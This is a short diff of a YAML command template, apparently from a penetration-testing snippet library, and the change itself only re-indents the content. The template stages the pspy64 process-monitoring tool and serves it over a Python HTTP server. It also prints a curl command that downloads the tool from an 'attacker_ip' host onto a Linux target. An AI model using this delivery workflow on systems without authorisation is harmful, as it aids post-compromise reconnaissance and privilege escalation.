@@ -4,11 +4,11 @@ metadata:
   tags: ["system", "linux"]
   created: "2025-03-29"
   author: "Unknown"
-  
+
 content: |
-    mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/pspy/pspy64 packstation/outbound/; \
-    echo '================================================================'; \
-    echo '                       -----Linux------                         '; \
-    echo 'Deliver: curl http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/pspy64 -o <%=$(esh variables/delivery_path_linux)%>/pspy64'; \
-    echo '================================================================'; \
-    python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/pspy/pspy64 packstation/outbound/; \
+  echo '================================================================'; \
+  echo '                       -----Linux------                         '; \
+  echo 'Deliver: curl http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/pspy64 -o <%=$(esh variables/delivery_path_linux)%>/pspy64'; \
+  echo '================================================================'; \
+  python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
